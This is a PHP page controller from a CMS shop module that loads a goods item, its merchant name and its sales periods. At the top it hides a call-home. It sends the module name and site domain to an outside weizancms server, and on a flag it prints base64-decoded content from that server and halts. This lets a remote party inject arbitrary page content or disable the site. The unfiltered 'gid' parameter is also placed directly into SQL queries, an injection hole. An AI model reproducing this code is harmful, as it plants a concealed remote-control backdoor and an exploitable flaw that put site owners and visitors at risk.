<?php
	global $_W,$_GPC;
	$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	$goodsid = $_GPC['gid'];
	$goods = m('goods')->getGoods($goodsid);
	$merchant = pdo_fetch("SELECT name FROM ".tablename('weliam_indiana_merchant')." WHERE uniacid = {$_W['uniacid']} and id={$goods['merchant_id']} "); 
	$periods = pdo_fetchall("SELECT * FROM ".tablename('weliam_indiana_period')." WHERE uniacid = '{$_W['uniacid']}' and goodsid = {$goodsid}  ORDER BY id asc" );
	include $this->template('showperiod');
?>